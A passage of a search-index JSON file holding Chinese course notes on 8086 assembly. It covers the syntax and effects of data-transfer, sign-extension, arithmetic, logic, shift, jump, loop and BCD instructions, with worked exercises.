ds:[10F0h]\nmov ax, [bx]\n</code></pre> <p>\u8bbe\u6709\u4e00\u5185\u5b58\u5b57\u8282Y\uff0cY\u7684\u504f\u79fb\u5730\u5740\u4e0e\u6bb5\u5730\u5740\u6309\u987a\u5e8f\u5b58\u653e\u5728\u4ece\u5730\u57401000:10F0\u8d77\u7684\u5185\u5b58\u5355\u5143\u4e2d\uff0c\u8bf7\u5199\u51fa\u6c47\u7f16\u6307\u4ee4\u628aY\u7684\u503c\u52a01\u3002(\u8981\u6c42\u4f7f\u7528LES\u6307\u4ee4)</p> <pre><code>mov ax, 1000h\nmov ds, ax\nles di, dword ptr ds:[10F0h]\ninc byte ptr es:[di]\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_3","title":"\u6269\u5145\u6307\u4ee4","text":"<p>CBW</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cbw</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a AL \u4e2d\u7684\u503c\u7b26\u53f7\u6269\u5145\u81f3 AX \u4e2d</li> <li>\u6ce8\u610f\uff1a Convert Byte to Word</li> <li>\u4f8b\u5b50\uff1a<ul> <li><code>cbw ; when al = 7Fh</code>  =&gt; <code>AX = 007Fh</code></li> <li><code>cbw ; when al = 0FCh</code> =&gt; <code>AX = 0FFFCh</code></li> </ul> </li> </ul> <p>CWD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cwd</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a AX \u4e2d\u7684\u503c\u7b26\u53f7\u6269\u5145\u81f3 DX:AX \u4e2d</li> <li>\u6ce8\u610f\uff1a Convert word to dword</li> </ul> <p>CDQ</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cdq</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a EAX \u4e2d\u7684\u503c\u7b26\u53f7\u6269\u5145\u81f3 EDX:EAX \u4e2d</li> <li>\u6ce8\u610f\uff1a Convert dword to qword</li> </ul> <p>MOVSX</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a movsx dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a\u503c src \u7b26\u53f7\u6269\u5145\u81f3 dest \u4e2d</li> <li>\u6ce8\u610f\uff1a dest \u7684\u4f4d\u5bbd\u9700\u5927\u4e8e src</li> <li>\u4f8b\u5b50\uff1a<ul> <li><code>movsx bx, al ; al = 80h</code> =&gt; <code>bx = 0FF80h</code></li> </ul> </li> </ul> <p>MOVZX</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a movzx dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u628a\u503c src \u96f6\u6269\u5145\u81f3 dest \u4e2d</li> <li>\u6ce8\u610f\uff1a dest \u7684\u4f4d\u5bbd\u9700\u5927\u4e8e src</li> <li>\u4f8b\u5b50\uff1a<ul> <li><code>movzx bx, al ; al = 80h</code> =&gt; <code>bx = 0080h</code></li> </ul> </li> </ul> <p>XLAT</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xlat</li> <li>\u6307\u4ee4\u6548\u679c\uff1a al = byte ptr ds:[bx+al]</li> </ul> <p>\u5229\u7528 xlat \u6307\u4ee4\u548c\u8f6c\u6362\u8868\u5c06\u5341\u8fdb\u5236\u6574\u6570\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u5e76\u8f93\u51fa\uff1a</p> <pre><code>.386\ndata segment use16\nt db \"0123456789ABCDEF\"\nx dd 2147483647\ndata ends\n\ncode segment use16\nassume cs:code, ds:data\nmain:\n  mov ax, data      ;\\\n  mov ds, ax        ; | ds:bx-&gt;t[0]\n  mov bx, offset t  ;/\n  mov cx, 8\n  mov eax, [x]\nnext:\n  rol eax, 4\n  push eax\n  and eax, 0Fh\n  xlat\n  mov ah, 2\n  mov dl, al\n  int 21h\n  pop eax\n  loop next\n  mov ah, 4Ch\n  int 21h\ncode ends\nend main\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_4","title":"\u7b97\u6570\u8fd0\u7b97\u6307\u4ee4","text":""},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_5","title":"\u52a0\u6cd5\u6307\u4ee4","text":"<p>ADD</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a add dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest += src</li> </ul> <p>ADC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a adc dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest += src + CF</li> <li>\u6ce8\u610f\uff1a \u5373\u5e26\u8fdb\u4f4d\u52a0\u6cd5\uff0cadd with carry</li> </ul> <p>INC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a inc op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op++</li> <li>\u6ce8\u610f\uff1a inc \u6307\u4ee4\u4e0d\u5f71\u54cd CF</li> </ul> <p>\u4e60\u9898</p> <p>\u6c42 12345678h+4243BCBCh \u7684\u548c\uff0c\u8981\u6c42\u7ed3\u679c\u5b58\u653e\u5728\u5bc4\u5b58\u5668DX:AX\u4e2d\uff1a</p> <pre><code>mov ax, 5678h\nmov dx, 1234h\nadd ax, 0BCBCh\nadc dx, 4243h\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_6","title":"\u51cf\u6cd5\u6307\u4ee4","text":"<p>SUB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sub dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest -= src</li> </ul> <p>SBB</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sbb dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest - src - CF</li> <li>\u6ce8\u610f\uff1a \u5373\u5e26\u501f\u4f4d\u51cf\u6cd5\uff0csubtract with borrow</li> </ul> <p>DEC</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a dec op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op--</li> <li>\u6ce8\u610f\uff1a dec \u6307\u4ee4\u4e0d\u5f71\u54cd CF</li> </ul> <p>NEG</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a neg op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op = -op</li> <li>\u6ce8\u610f\uff1a \u76f8\u5f53\u4e8e\u53d6\u53cd\u52a0\u4e00(\u6c42\u8865\u7801, op = not op + 1)\uff0c\u975e\u96f6\u6570\u6c42\u8865\u540e\u00a0cf=1\uff0c0\u6c42\u8865\u540e\u00a0cf=0</li> </ul> <p>CMP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a cmp op1, op2</li> <li>\u6307\u4ee4\u6548\u679c\uff1a compare op1 - op2</li> <li>\u6ce8\u610f\uff1a cmp \u6307\u4ee4\u5e76\u4e0d\u8ba1\u7b97\u5dee\u503c\uff0c\u4f46\u4f1a\u50cf sub op1, op2 \u5f71\u54cd\u72b6\u6001\u6807\u5fd7\uff0c\u540e\u9762\u901a\u5e38\u63a5\u8df3\u8f6c\u6307\u4ee4</li> </ul> <p>\u8bd5\u5199\u51fa\u5bf9\u5b58\u653e\u5728DX:AX\u4e2d\u768432\u4f4d\u6570\u8fdb\u884c\u6c42\u8865(neg)\u7684\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217</p> <pre><code>neg ax    ; \u82e5 ax \u975e\u96f6\uff0c\u5219\u4ea7\u751f\u8fdb\u4f4d CF=1\npushf     ; \u4fdd\u5b58 CF \u72b6\u6001\nneg dx\npopf      ; \u6062\u590d CF \u72b6\u6001\nsbb dx, 0 ; \u51cf\u53bb neg ax \u4ea7\u751f\u7684\u8fdb\u4f4d\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_7","title":"\u4e58\u6cd5\u6307\u4ee4","text":"<p>MUL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a mul src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u975e\u7b26\u53f7\u6570\u4e58\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cax = al * src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cdx:ax = ax * src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0cedx:eax = eax * src</li> </ul> </li> <li>Example: DX:AX=<code>123400h</code> \u27a1 DX=<code>0012h</code>, AX=<code>3400h</code> </li> </ul> <p>IMUL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a imul src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b26\u53f7\u6570\u4e58\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cax = al * src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cdx:ax = ax * src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0cedx:eax = eax * src</li> </ul> </li> </ul> <p>IMUL \u7684\u7b2c\u4e8c\u7c7b\u7528\u6cd5</p> <p>Intel \u7b2c\u4e8c\u4ee3CPU\u4e3a<code>IMUL</code>\u65b0\u589e\u4e86\u7528\u6cd5\uff0c\u652f\u6301\u4e24\u4e2a\u6216\u4e09\u4e2a\u64cd\u4f5c\u6570\u3002\u4ee5\u4e0b\u56db\u7ec4\u6307\u4ee4\u90fd\u5b9e\u73b0\u5bf9<code>eax</code>\u4e5810\uff0c\u4e0d\u540c\u7684\u662f\uff0c<code>lea</code>\u548c<code>imul</code>\u6307\u4ee4\u5e76\u4e0d\u80fd\u5904\u7406\u4e58\u6cd5\u7684\u6ea2\u51fa\uff1a</p> <pre><code>mov ebx, 10\nmul ebx               ; edx:eax = eax * ebx\n\nmov ebx, 10\nimul eax, ebx         ; eax = eax * ebx\n\nimul eax, eax, 10     ; eax = eax * Imm\n\nadd eax, eax\nlea eax, [eax+eax*4]  ; eax = eax*2 + eax*8\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_8","title":"\u9664\u6cd5\u6307\u4ee4","text":"<p>DIV</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a div src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u975e\u7b26\u53f7\u6570\u9664\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / src, ah = ax % src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / src, dx = dx:ax % src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0ceax = edx:eax / src, edx = edx:eax % src</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u82e5\u9664\u6570\u4e3a 0 \u6216\u8005\u4fdd\u5b58\u5546\u7684\u5bc4\u5b58\u5668\u65e0\u6cd5\u5bb9\u7eb3\u5546\u65f6\u4f1a\u53d1\u751f\u9664\u6cd5\u6ea2\u51fa\uff0c\u6b64\u65f6 CPU \u4f1a\u5728\u9664\u6cd5\u6307\u4ee4\u4e0a\u65b9\u63d2\u5165\u5e76\u6267\u884c\u4e00\u6761 int 00h \u6307\u4ee4(\u9664\u6cd5\u7684\u5f02\u5e38\u5904\u7406)</li> </ul> <p>IDIV</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a idiv src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b26\u53f7\u6570\u9664\u6cd5<ul> <li>src \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / src, ah = ax % src</li> <li>src \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / src, dx = dx:ax % src</li> <li>src \u4e3a 32 \u4f4d\u65f6\uff0ceax = edx:eax / src, edx = edx:eax % src</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u82e5\u9664\u6570\u4e3a 0 \u6216\u8005\u4fdd\u5b58\u5546\u7684\u5bc4\u5b58\u5668\u65e0\u6cd5\u5bb9\u7eb3\u5546\u65f6\u4f1a\u53d1\u751f\u9664\u6cd5\u6ea2\u51fa\uff0c\u6b64\u65f6 CPU \u4f1a\u5728\u9664\u6cd5\u6307\u4ee4\u4e0a\u65b9\u63d2\u5165\u5e76\u6267\u884c\u4e00\u6761 int 00h \u6307\u4ee4</li> </ul>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_9","title":"\u903b\u8f91\u8fd0\u7b97\u548c\u79fb\u4f4d\u6307\u4ee4","text":""},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_10","title":"\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4","text":"<p>AND</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a and dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest &amp; src</li> </ul> <p>OR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a or dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest | src</li> </ul> <p>XOR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a xor dest, src</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest = dest ^ src</li> </ul> <p>NOT</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a not op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a op = ^op</li> </ul> <p>TEST</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a test dest, op</li> <li>\u6307\u4ee4\u6548\u679c\uff1a test dest &amp; src</li> <li>\u6ce8\u610f\uff1a test \u6307\u4ee4\u5e76\u4e0d\u4fdd\u5b58\u7ed3\u679c\u503c\uff0c\u4f46\u4f1a\u50cf and dest, src \u4e00\u6837\u5f71\u54cd\u72b6\u6001\u6807\u5fd7</li> </ul>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_11","title":"\u79fb\u4f4d\u6307\u4ee4","text":"<p>SHL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a shl dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &lt;&lt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u53f3\u4fa7\u88650\uff0c\u5de6\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl<ul> <li>\u82e5\u4e3a .386\uff0c\u5219 idata \u53ef\u4e3a\u4efb\u610f\u5927\u5c0f\u7684 8 \u4f4d\u5e38\u6570</li> <li>\u82e5\u4e3a 8086\uff0c\u5219 idata \u53ea\u80fd\u4e3a 1</li> <li>\u5176\u5b83\u79fb\u4f4d\u6307\u4ee4\u548c shl \u6307\u4ee4\u89c4\u5b9a\u76f8\u540c\uff0c\u4e0d\u518d\u505a\u9610\u8ff0</li> </ul> </li> </ul> <p>SHR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a shr dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &gt;&gt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u5de6\u4fa7\u88650\uff0c\u53f3\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>SAL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sal dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &lt;&lt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u7b97\u672f\u5de6\u79fb\u6307\u4ee4\uff0c\u4e0e SHL \u5b8c\u5168\u76f8\u540c</li> </ul> <p>SAR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a sar dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a dest &gt;&gt;= count &amp; 1Fh</li> <li>\u6ce8\u610f\uff1a \u5de6\u4fa7\u4e0d\u53d8\uff0c\u53f3\u4fa7\u6ea2\u51fa\u4f4d\u843d\u5165 CF\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>ROL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rol dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5bf9\u00a0dest\u00a0\u5faa\u73af\u5de6\u79fb\u00a0count\u00a0&amp; 1Fh \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230\u00a0CF\u00a0\u4e2d</li> <li>\u6ce8\u610f\uff1a rotate left\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>ROR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a ror dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5bf9\u00a0dest\u00a0\u5faa\u73af\u53f3\u79fb\u00a0count &amp; 1Fh\u00a0\u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230\u00a0CF\u00a0\u4e2d</li> <li>\u6ce8\u610f\uff1a rotate right\uff1bcount \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>RCL</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rcl dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373\u00a0CF\u00a0\u52a0\u5728\u00a0dest\u00a0\u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb</li> <li>\u6ce8\u610f\uff1a count \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>RCR</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a rcr dest, count</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5e26\u8fdb\u4f4d\u5faa\u73af\u53f3\u79fb\uff0c\u5373\u00a0CF\u00a0\u52a0\u5728\u00a0dest\u00a0\u53f3\u4fa7\u4e00\u8d77\u5faa\u73af\u53f3\u79fb</li> <li>\u6ce8\u610f\uff1a count \u53ea\u80fd\u662f idata \u6216 cl</li> </ul> <p>\u8bd5\u5199\u51fa\u628a32\u4f4d\u6570 3F7E59ACh \u903b\u8f91\u5de6\u79fb2\u4f4d\u7684\u6c47\u7f16\u6307\u4ee4\u5e8f\u5217\uff0c\u8981\u6c42\u7ed3\u679c\u5b58\u653e\u5728DX:AX\u4e2d</p> <pre><code>    mov ax, 59ACh\n    mov dx, 3F7Eh\n    mov cx, 2\nagain:\n    shl ax, 1\n    rcl dx, 1\n    loop again\n</code></pre>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_12","title":"\u63a7\u5236\u8f6c\u79fb\u6307\u4ee4","text":"<p>\u6839\u636e\u8df3\u8f6c\u8ddd\u79bb\u7684\u8fdc\u8fd1\uff0c<code>jmp</code> \u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>\u77ed\u8df3(short jump) \uff1a\u8df3\u8f6c\u8ddd\u79bb\u7528\u4e00\u4e2a\u5b57\u8282\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5 <code>EB</code> \u5f00\u5934<ul> <li>\u77ed\u8df3\u540e\u9762\u53ea\u80fd\u63a5\u76ee\u6807\u504f\u79fb\u5730\u5740\u6216\u6807\u53f7\uff1b\u800c\u8fd1\u8df3\u8fd8\u53ef\u4ee5\u63a5 16 \u4f4d\u5bc4\u5b58\u5668\u6216 16 \u4f4d\u53d8\u91cf</li> <li>\u77ed\u8df3\u673a\u5668\u7801\u7684 idata \u4e3a\u4e00\u4e2a\u5b57\u8282\uff0c\u5bf9\u5e94\u5927\u5c0f\u4e3a\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740($+2)</li> </ul> </li> <li>\u8fd1\u8df3(near jump) \uff1a\u8df3\u8f6c\u8ddd\u79bb\u6216\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u5b57\u8868\u793a\uff0c\u673a\u5668\u7801\u4ee5 <code>E9</code> \u5f00\u5934<ul> <li>\u673a\u5668\u7801 <code>E9FD1E</code> \u5bf9\u5e94\u6307\u4ee4 <code>1D3E:0100: jmp 2000h</code> \u5373\u8df3\u8f6c\u5230\u5730\u5740 <code>1D3E:2000</code></li> <li>\u5176\u4e2d <code>FD1E</code> \u542b\u4e49\u4e3a <code>1EFD = 2000h - 0103h</code>\uff0c\u5373\u76ee\u6807\u5730\u5740\u51cf\u53bb\u4e0b\u6761\u6307\u4ee4\u7684\u504f\u79fb\u5730\u5740</li> <li>\u504f\u79fb\u5730\u5740\u5728\u673a\u5668\u7801\u4e2d\u4e5f\u662f\u5c0f\u7aef\u5b58\u50a8</li> </ul> </li> <li>\u8fdc\u8df3(far jump) \uff1a\u76ee\u6807\u5730\u5740\u7528\u4e00\u4e2a\u8fdc\u6307\u9488\u8868\u793a(\u6bb5\u5730\u5740\uff1a\u504f\u79fb\u5730\u5740)\uff0c\u673a\u5668\u7801\u4ee5 <code>EA</code> \u5f00\u5934<ul> <li>\u673a\u5668\u7801 <code>EA0000FFFF</code> \u5bf9\u5e94\u6307\u4ee4 <code>jmp 0FFFFh:0000h</code> \u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u8fdc\u8df3\u4e0d\u80fd\u76f4\u63a5\u63a5\u5e38\u6570\u5730\u5740\uff0c\u4e0b\u9762\u4e24\u79cd\u65b9\u5f0f\u53ef\u4ee5\u5b9e\u73b0\u76f8\u540c\u6548\u679c\uff1a</li> </ul> </li> </ul> <pre><code>data segment\naddr dw 0000h, 0FFFFh\ndata ends\n\ncode segment\nassume cs:code, ds:data\nmain:\n    mov ax, data\n    mov ds, ax\n\n    ; jmp 0FFFFh:0000h\n\n    ; jmp dword ptr 32\u4f4d\u53d8\u91cf\n    jmp dword ptr [addr]\n\n    ; \u673a\u5668\u7801\u65b9\u5f0f\n    db 0EAh\n    dw 0\n    dw 0FFFFh\n\n    ; \u5047\u5b9a extra \u6bb5\u5df2\u6b63\u786e\u5b9a\u4e49\n    mov word ptr es:[di], 0000h\n    mov word ptr es:[di+4], 0FFFFh\n    jmp dword ptr es:[di]\ncode ends\nend main\n</code></pre> <p>\u4e3b\u8981\u901a\u8fc7\u6307\u4ee4\u673a\u5668\u7801\u957f\u5ea6\u533a\u5206\u8fd9\u4e09\u4e2a\u8df3</p> <p>\u4e0d\u8fc7\u6211\u4eec\u7f16\u5199\u4ee3\u7801\u7684\u65f6\u5019\u76f4\u63a5\u4f7f\u7528 <code>jcc</code> \u6307\u4ee4\u5373\u53ef\uff0c\u533a\u5206\u7c7b\u578b\u7684\u4e8b\u4ea4\u7ed9\u673a\u5668\u3002</p> Jcc\u6307\u4ee4 \u542b\u4e49 \u8df3\u8f6c\u6761\u4ef6 \u89e3\u91ca jc \u6709\u8fdb\u4f4d\u5219\u8df3 <code>CF==1</code> Jump if carry \u6709\u8fdb\u4f4d\u6216\u501f\u4f4d jnc \u65e0\u8fdb\u4f4d\u5219\u8df3 <code>CF==0</code> Jump if no carry \u65e0\u8fdb\u4f4d\u6216\u501f\u4f4d jz \u4e3a\u96f6\u5219\u8df3 <code>ZF==1</code> Jump if zero \u8fd0\u7b97\u7ed3\u679c\u4e3a 0 jnz \u4e0d\u4e3a\u96f6\u5219\u8df3 <code>ZF==0</code> Jump if not zero \u8fd0\u7b97\u7ed3\u679c\u4e0d\u4e3a 0 js \u6709\u7b26\u53f7\u4f4d\u5219\u8df3 <code>SF==1</code> Jump if sign \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u4e3a\u8d1f jns \u65e0\u7b26\u53f7\u4f4d\u5219\u8df3 <code>SF==0</code> Jump if no sign \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u4e3a\u6b63 jo \u6709\u6ea2\u51fa\u5219\u8df3 <code>OF==1</code> Jump if overflow \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u6709\u9519 jno \u65e0\u6ea2\u51fa\u5219\u8df3 <code>OF==0</code> Jump if not overflow \u7b26\u53f7\u6570\u8fd0\u7b97\u7ed3\u679c\u6b63\u786e jp \u6709\u5947\u5076\u6821\u9a8c\u6807\u5fd7\u5219\u8df3 <code>PF==1</code> Jump if parity \u8fd0\u7b97\u7ed3\u679c\u4f4e\u516b\u4f4d1\u7684\u4e2a\u6570\u4e3a\u5076 jnp \u65e0\u5947\u5076\u6821\u9a8c\u6807\u5fd7\u5219\u8df3 <code>PF==0</code> Jump if no parity \u8fd0\u7b97\u7ed3\u679c\u4f4e\u516b\u4f4d1\u7684\u4e2a\u6570\u4e3a\u5947 jcxz CX\u4e3a\u96f6\u5219\u8df3 <code>CX==0</code> Jump if CX is zero CX\u7684\u503c\u4e3a 0 jecxz ECX\u4e3a\u96f6\u5219\u8df3 <code>ECX==0</code> Jump if ECX is zero ECX\u7684\u503c\u4e3a 0 ja \u65e0\u7b26\u53f7\u5927\u4e8e\u5219\u8df3 <code>CF==0 &amp; ZF==0</code> \u4e0e <code>jnbe</code> \u5b8c\u5168\u7b49\u4ef7 jae \u65e0\u7b26\u53f7\u5927\u4e8e\u7b49\u4e8e\u5219\u8df3 jb \u65e0\u7b26\u53f7\u5c0f\u4e8e\u5219\u8df3 \u4e0e <code>jc</code>, <code>jnae</code> \u5b8c\u5168\u7b49\u4ef7 jbe \u65e0\u7b26\u53f7\u5c0f\u4e8e\u7b49\u4e8e\u5219\u8df3 <p>LOOP</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loop dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u5faa\u73af\u8df3\u8f6c CX \u6b21<ul> <li>if(--CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u5148\u4f5c\u51cf\u6cd5\uff0c\u518d\u5224\u65ad\u662f\u5426\u4e3a0\uff0c\u56e0\u6b64\u5c06CX\u8d4b\u503c\u4e3a0\u53ef\u5faa\u73af\u7684\u6b21\u6570\u6700\u591a(1+FFFF)\uff1b\u5982\u679c\u4e0d\u5e0c\u671bCX\u4e3a0\u65f6\u8fdb\u5165\u5faa\u73af\uff0c\u5e94\u8be5\u5728\u8fdb\u5165\u5faa\u73af\u524d\u4f7f\u7528 <code>jcxz</code> \u6307\u4ee4\u8df3\u8f6c\u5230\u5faa\u73af\u51fa\u53e3</li> </ul> <p>LOOPZ</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loopz dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u6700\u591a\u5faa\u73af CX \u6b21<ul> <li>if(ZF == 1 &amp;&amp; --CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d</li> </ul> <p>LOOPNZ</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a loopnz dest</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u4e0d\u7b49\u4e8e\u96f6\u5219\u5faa\u73af\uff0c\u6700\u591a\u5faa\u73af CX \u6b21<ul> <li>if(ZF == 0 &amp;&amp; --CX != 0) IP = dest;</li> </ul> </li> <li>\u6ce8\u610f\uff1a \u4e0d\u5f71\u54cd\u6807\u5fd7\u4f4d</li> </ul>"},{"location":"Courses/8086asm/%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5/#_13","title":"\u5341\u8fdb\u5236\u8c03\u6574\u6307\u4ee4","text":"<p>\u4f3c\u4e4e\u4e0d\u5728\u8003\u8bd5\u8303\u56f4\u5185</p> <p>Binary Coded Decimal \u662f\u6307\u7528\u4e8c\u8fdb\u5236\u7f16\u7801\u7684\u5341\u8fdb\u5236\u6570\u3002</p> <ul> <li>\u538b\u7f29BCD\u7801 \u4ee54\u4f4d\u4e8c\u8fdb\u5236\u8868\u793a1\u4f4d\u5341\u8fdb\u5236<ul> <li>\\(37_{Decimal}\\Rightarrow 37h\\)</li> </ul> </li> <li>\u975e\u538b\u7f29BCD\u7801 \u4ee58\u4f4d\u4e8c\u8fdb\u5236\u8868\u793a1\u4f4d\u5341\u8fdb\u5236<ul> <li>\\(37_{Decimal}\\Rightarrow 0307h\\)</li> <li>\u9ad8\u4f4d\u6ca1\u6709\u610f\u4e49\uff0c\u53ef\u4ee5\u4e3a\u4efb\u610f\u503c\uff0c\u5982 <code>06h</code>,<code>36h</code> \u90fd\u8868\u793a\u5341\u8fdb\u5236\u6570 6</li> </ul> </li> </ul> <p># \u538b\u7f29BCD\u7801\u8c03\u6574\u6307\u4ee4</p> <p>DAA</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a daa</li> <li>\u6307\u4ee4\u6548\u679c\uff1a \u538b\u7f29BCD\u7801\u52a0\u6cd5\u7684\u5341\u8fdb\u5236\u8c03\u6574\uff0c\u5c06AL\u8c03\u6574\u56deBCD\u7801<ul> <li>if (af == 1 || (al&amp;0Fh) &gt; 9) al += 6, af = 1; else af = 0</li> <li>if (cf == 1 || al &gt; 9Fh) al += 60h, cf = 1; else cf = 0</li> </ul> </li> </ul> <p>DAS</p> <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1a das</li> <li>\u6307\u4ee4\u6548\u679c\uff1a 